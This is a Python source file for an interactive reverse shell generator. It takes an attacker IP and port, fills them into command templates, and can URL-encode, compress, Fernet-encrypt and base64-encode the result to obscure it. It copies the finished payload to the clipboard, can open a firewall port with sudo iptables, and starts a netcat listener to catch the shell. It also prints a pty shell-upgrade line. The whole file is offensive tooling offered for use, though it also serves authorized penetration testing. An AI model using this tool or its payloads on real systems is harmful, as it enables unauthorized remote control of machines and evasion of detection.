#!/usr/bin/env python3
# coding=utf-8
import subprocess
import base64
import cryptography
from cryptography.fernet import Fernet
import gzip
#import tarfile
import string
#import sh
import bz2
import lzma
import random
import ipaddress
import os
import sys
import urllib.parse
from string import Template
from typing import List

import readchar
from colorama import Fore, Style
from netifaces import *
from pyperclip import copy

banner = '''
                         __         __   __                  
  ____ ___  _  __  ___  / /  ___   / /  / /  ___ _ ___   ___ 
 / __// -_)| |/ / (_-< / _ \/ -_) / /  / /  / _ `// -_) / _ \\
/_/   \__/ |___/ /___//_//_/\__/ /_/  /_/   \_, / \__/ /_//_/
                                           /___/
'''

header = Template(
    '\n' + Style.BRIGHT + '---------- [ ' + Fore.CYAN + '$text' + Fore.RESET + ' ] ----------' + Style.RESET_ALL + '\n'
)
prompt = Template(
    Style.BRIGHT + '[' + Fore.BLUE + ' # ' + Fore.RESET + '] ' + Style.RESET_ALL + '$text : ' + Style.BRIGHT
)
code = Template(Style.BRIGHT + Fore.GREEN + '$code' + Style.RESET_ALL)
success = Template(Style.BRIGHT + '[' + Fore.GREEN + ' + ' + Fore.RESET + '] ' + Style.RESET_ALL + '$text')
info = Template(Style.BRIGHT + '[' + Fore.YELLOW + ' ! ' + Fore.RESET + '] ' + Style.RESET_ALL + '$text')
fail = Template(Style.BRIGHT + '[' + Fore.RED + ' - ' + Fore.RESET + '] ' + Style.RESET_ALL + '$text')

ip = port = shell = command = base64_encoding = ''

choices = ['no', 'yes']
shells = ['/bin/sh', '/bin/bash', '/bin/zsh', '/bin/ksh', '/bin/tcsh', '/bin/dash']
commands = sorted([command for command in os.listdir(sys.path[0] + '/commands')])

compressions_types = ['gzip', 'bzip2', 'lzma']
gzip_compression_levels = ['0','1', '2', '3', '4', '5', '6', '7', '8', '9']
gzip_compression_level = None
gzip_compression_data = ''



def print_banner():
    os.system('cls' if os.name == 'nt' else 'clear')

    # not just print(banner)
    # print banner with rainbow colors
    for i in range(len(banner)):
        # use lolcal colors
        if i % 2 == 0:
            print(Fore.RED + banner[i], end='')
        elif i % 3 == 0:
            print(Fore.GREEN + banner[i], end='')
        elif i % 5 == 0:
            print(Fore.BLUE + banner[i], end='')
        elif i % 7 == 0:
            print(Fore.CYAN + banner[i], end='')
        elif i % 11 == 0:
            print(Fore.MAGENTA + banner[i], end='')
        elif i % 13 == 0:
            print(Fore.YELLOW + banner[i], end='')
        elif i % 17 == 0:
            print(Fore.WHITE + banner[i], end='')
        else:
            print(Fore.RESET + banner[i], end='')
    print(Fore.RESET)

def is_valid(ip_address):
    try:
        ipaddress.ip_address(ip_address)
        return True
    except ValueError:
        return False


def exit_program():
    print('\n' + success.safe_substitute(text='Goodbye, friend.'))
    exit(0)


def select(
        options: List[str],
        selected_index: int = 0) -> int:
    print('\n' * (len(options) - 1))
    while True:
        print(f'\033[{len(options) + 1}A')
        for i, option in enumerate(options):
            print('\033[K{}{}'.format(
                '\033[1m[\033[32;1m x \033[0;1m]\033[0m ' if i == selected_index else
                '\033[1m[   ]\033[0m ', option))
        keypress = readchar.readkey()
        if keypress == readchar.key.UP:
            new_index = selected_index
            while new_index > 0:
                new_index -= 1
                selected_index = new_index
                break
        elif keypress == readchar.key.DOWN:
            new_index = selected_index
            while new_index < len(options) - 1:
                new_index += 1
                selected_index = new_index
                break
        elif keypress == readchar.key.ENTER or keypress == '\n':
            break
        elif keypress == readchar.key.CTRL_C:
            raise KeyboardInterrupt
    return selected_index


def specify_ip():
    print(header.safe_substitute(text='SELECT IP'))
    options = {}
    for interface in interfaces():
        try:
            ip_address = ifaddresses(interface)[AF_INET][0]['addr']
            if ip_address != '127.0.0.1':
                options[ip_address] = ip_address + ' on ' + interface
        except KeyError:
            pass
    options['manual'] = 'Specify manually'
    global ip
    ip = list(options.keys())[(select(list(options.values())))]
    if ip == 'manual':
        while True:
            input_ip = input(prompt.safe_substitute(text='Enter IP address'))
            if is_valid(input_ip):
                ip = input_ip
                break
            else:
                print(fail.safe_substitute(text='Please, specify a valid IP address!'))


def specify_port():
    print(header.safe_substitute(text='SPECIFY PORT'))
    while True:
        try:
            input_port = input(prompt.safe_substitute(text='Enter port number'))
            if int(input_port) in range(1, 65535):
                global port
                port = input_port
                break
            else:
                raise ValueError
        except ValueError:
            print(fail.safe_substitute(text='Please, choose a valid port number!'))


def select_command():
    print(header.safe_substitute(text='SELECT COMMAND'))
    global command
    command = commands[select(commands)]

def select_manage_firewall_iptables():
    print(header.safe_substitute(text='SELECT FIREWALL'))
    print(info.safe_substitute(text='Do you want to enable automanage of iptables?'))
    return choices[select(choices)]

def select_shell():
    if command != 'windows_powershell' and command != 'unix_bash' and command != 'unix_telnet':
        print(header.safe_substitute(text='SELECT SHELL'))
        global shell
        shell = shells[(select(shells))]

def select_base64_encoding():
    print(header.safe_substitute(text='SELECT BASE64 ENCODING'))
    global base64_encoding
    base64_encoding = choices[(select(choices))]

def select_encryption():
    print(header.safe_substitute(text='SELECT FERNET ENCRYPTION'))
    # display an info message 'if encryption is enabled that require base64 encoding to be enabled so base64 encoding is enabled by default if you choose to enable encryption'
    print(info.safe_substitute(text='If encryption is enabled that require base64 encoding to be enabled so base64 encoding is enabled by default if you choose to enable encryption'))
    global encryption
    encryption = choices[(select(choices))]
    # enable base64 encoding if encryption is enabled
    if encryption == 'yes':
        global base64_encoding
        base64_encoding = 'yes'

def select_compression():
    print(header.safe_substitute(text='SELECT COMPRESSION'))
    # display an info message 'if compression is enabled that require base64 encoding to be enabled so base64 encoding is enabled by default if you choose to enable compression'
    print(info.safe_substitute(text='If compression is enabled that require base64 encoding to be enabled so base64 encoding is enabled by default if you choose to enable compression'))
    global compression
    compression = choices[(select(choices))]
    # enable base64 encoding if compression is enabled
    if compression == 'yes':
        global base64_encoding
        base64_encoding = 'yes'

def select_compressions_types(selected_compression):
    if selected_compression == 'yes':
        print(header.safe_substitute(text='SELECT COMPRESSION TYPE'))
        global compressions_types
        compressions_types = compressions_types[(select(compressions_types))]
        if compressions_types == 'gzip':
            print(header.safe_substitute(text='SELECT COMPRESSION LEVEL'))
            global gzip_compression_level
            gzip_compression_level = gzip_compression_levels[(select(gzip_compression_levels))]


def test_specified_port_inbound_firewall_localhost():
    print(header.safe_substitute(text='TEST SPECIFIED PORT INBOUND FIREWALL ON LOCALHOST'))
    try:
        random_tmp_name = ""
        # generate random name to the string random_tmp_name
        for i in range(10):
            random_tmp_name += random.choice(string.ascii_letters + string.digits)
        # create temporary file with random name
        with open("/tmp/"+random_tmp_name, 'w') as tmp_file:
            pass

        # check if iptables is installed with apt-get --list-installed
        # command is 'apt list --installed 2>/dev/null | grep "iptables" | wc -l > /tmp/{random_tmp_name}' and returns 1 if installed
        # command executed by os.system()
        os.system('apt list --installed 2>/dev/null | grep "iptables" | wc -l > /tmp/'+random_tmp_name)
        # read from temporary file
        with open("/tmp/"+random_tmp_name, 'r') as tmp_file:
            iptables_installed = int(tmp_file.read())
            tmp_file.close()
        # remove temporary file
        os.remove("/tmp/"+random_tmp_name)
        if iptables_installed == 1:
            # print info message iptables is installed
            print(info.safe_substitute(text='iptables is installed'))
        try:
            subprocess.run(['sudo', 'iptables', '-A', 'INPUT', '-p', 'tcp', '--dport', port, '-j', 'ACCEPT'], check=True)
            print(success.safe_substitute(text='Port ' + port + ' is now open on localhost'))
        except subprocess.CalledProcessError:
            # print error message if iptables fails to add rule
            print(fail.safe_substitute(text='Failed to add rule to iptables'))
            try:
                # check if iptables have rules for specified port
                subprocess.run(['sudo', 'iptables', '-L', 'INPUT', '-n', '-v', '-x', '-t', 'filter', '-p', 'tcp', '--dport', port], check=True)
                # print info message iptables have rules for specified port
                print(info.safe_substitute(text='iptables have rules for specified port'))
                print(success.safe_substitute(text='Port ' + port + ' is now open on localhost'))
            except:
                # print fail message iptables have no rules for specified port
                print(fail.safe_substitute(text='iptables have no rules for specified port'))
                print(fail.safe_substitute(text='Port ' + port + ' is not open on localhost'))
                # display error message 'Port is not open on localhost, so you can\'t use it' in red color with system to terminal
                print(Fore.RED + 'Port ' + port + ' is not open on localhost, so you can\'t use it')
                print(Fore.RESET)
                exit(1)    
    except:
        print(fail.safe_substitute(text='iptables is not installed!'))
        # display error message 'iptables is not installed on localhost, so you can\'t use it' in red color with system to terminal
        print(Fore.RED + 'iptables is not installed on localhost, so you can\'t use it')
        print(Fore.RESET)
        exit(1)
    
def build_command():
    global command
    with open(sys.path[0] + '/commands/' + command) as f:
        command = Template(f.read())
    command = command.safe_substitute(ip=ip, port=port, shell=shell)
    print(header.safe_substitute(text='URL ENCODE'))
    if select(choices) == 1:
        command = urllib.parse.quote_plus(command)
        print(info.safe_substitute(text='Command is now URL encoded!'))
    
    if compression == 'yes':
        # check if compressions_types is 'gzip' or 'bzip2' or 'xz' or 'lzma' or 'lzop' or 'lz4' or 'zstd' and compress command if it is, command is equal to the compressed command
        if compressions_types == 'gzip':
            command = gzip.compress(command.encode(), compresslevel=int(gzip_compression_level))
            print(info.safe_substitute(text='Command is now compressed with gzip!'))
            print(info.safe_substitute(text=Fore.BLUE+'(gzip)'+Fore.RESET+'Compression level is ' + gzip_compression_level))
        elif compressions_types == 'bzip2':
            command = bz2.compress(command.encode())
            print(info.safe_substitute(text='Command is now compressed with bzip2!'))
        elif compressions_types == 'lzma':
            command = lzma.compress(command.encode())
            print(info.safe_substitute(text='Command is now compressed with xz!'))
        # lzop is not supported by python 3.6, so it is not included in the list of compressions_types
        # zstd is not supported by python 3.6, so it is not included in the list of compressions_types
        else:
            print(fail.safe_substitute(text='Compression type is not supported!'))
            print(fail.safe_substitute(text='Command is not compressed!'))
            print(fail.safe_substitute(text='Command is not compressed with gzip!'))
            print(fail.safe_substitute(text='Command is not compressed with bzip2!'))
            print(fail.safe_substitute(text='Command is not compressed with lzma!'))
            # print error message 'Compression type is not supported, so you can\'t use it' in red color with system to terminal
            print(Fore.RED + 'Compression type is not supported, so you can\'t use it')
            print(Fore.RESET)
            exit(1)
    else:
        print(info.safe_substitute(text='Command is not compressed!'))
    
    # encryption with fernet if encryption is 'yes'
    if encryption == 'yes':
        # generate key
        # key is generated with Fernet.generate_key() and is equal to the key
        # print an message 'Fernet key generating...' in yellow color with system to terminal
        print(Fore.YELLOW + 'Fernet key generating...')
        print(Fore.RESET)
        key = Fernet.generate_key()
        # print an message 'Fernet key generated!' in green color with system to terminal
        print(Fore.GREEN + 'Fernet key generated!')
        print(Fore.RESET)
        # encode command with the str function .encode() if is an string and not bytes encoded
        if isinstance(command, str):
            command = command.encode()
        # initailize fernet with key
        f = Fernet(key)
        # print an message 'Fernet key is now used to encrypt command! 🔑' in green color with system to terminal
        print(Fore.GREEN + 'Fernet key is now used to encrypt command! 🔑')
        print(Fore.RESET)
        # print 'Fernet encryption...' in yellow color with system to terminal
        print(Fore.YELLOW + 'Fernet encryption...')
        print(Fore.RESET)
        # encrypt command with Fernet.encrypt() and is equal to the encrypted command
        token = f.encrypt(command)
        # print an message 'Command is now encrypted!' in green color with system to terminal
        print(Fore.GREEN + 'Command is now encrypted!')
        print(Fore.RESET)
        # create an random named tmp file with the random function random.randint() and is equal to the random_file_name, prefix is '/tmp/' and suffix is '.key'
        random_file_name = '/tmp/' + str(random.randint(1, 1000000)) + '.key'
        # print an message 'Key file name is ' + random_file_name + '!' in green color with system to terminal
        print(Fore.GREEN + 'Key file name is ' + random_file_name + '!')
        print(Fore.RESET)
        # write key to random_file_name
        with open(random_file_name, 'wb') as f:
            f.write(key)
        # print an message 'Key file is now created!' in green color with system to termina
        print(Fore.GREEN + 'Key file is now created!')
        print(Fore.RESET)
        # display an symbol 'FERNET ENCRYPTION DONE 💣' in red color with system to terminal
        print(Fore.RED + 'FERNET ENCRYPTION DONE 💣')
        print(Fore.RESET)



    # encode command if is an string and not bytes encoded
    if isinstance(command, str):
            command = command.encode()

    # base64 encode of command if base64_encoding is 'yes'
    if base64_encoding == 'yes' or encryption == 'yes' or compression == 'yes':
        command = base64.b64encode(command).decode()
        print(info.safe_substitute(text='Command is now base64 encoded!'))
    # if base64_encoding is 'no' do nothing, print command as is without base64 encoding
    else:
        print(info.safe_substitute(text='Command is not base64 encoded!'))

    print(header.safe_substitute(text='FINISHED COMMAND'))
    print(code.safe_substitute(code=command) + '\n')

    if 'SSH_CLIENT' not in os.environ or 'SSH_TTY' not in os.environ:
        copy(command)
        print(info.safe_substitute(text='Reverse shell command copied to clipboard!'))

    print(success.safe_substitute(text='In case you want to upgrade your shell, you can use this:\n'))
    print(code.safe_substitute(code="python -c 'import pty;pty.spawn(\"/bin/bash\")'"))


def setup_listener():
    if os.name != 'nt':
        print(header.safe_substitute(text='SETUP LISTENER'))
        if select(choices) == 1:
            os.system('\n$(which ncat || which nc) -nlvp ' + port)
        else:
            exit_program()


if __name__ == '__main__':
    print_banner()
    try:
        specify_ip()
        specify_port()
        if select_manage_firewall_iptables() == 'yes': 
            #print info message if user wants to manage firewall with iptables 'automatic management of iptables enabled' in green colors 
            print(info.safe_substitute(text=Fore.GREEN + 'automatic management of iptables enabled')) 
            print(Fore.RESET)
            test_specified_port_inbound_firewall_localhost()
        else:
            #print info message if user wants to manage firewall with iptables 'automatic management of iptables disabled' in red colors
            print(info.safe_substitute(text=Fore.RED + 'automatic management of iptables disabled'))
            print(Fore.RESET)
        select_command()
        select_shell()
        select_compression()
        select_compressions_types(compression)
        select_encryption()
        if base64_encoding!='yes': select_base64_encoding()
        build_command()
        setup_listener()
    except KeyboardInterrupt:
        exit_program()
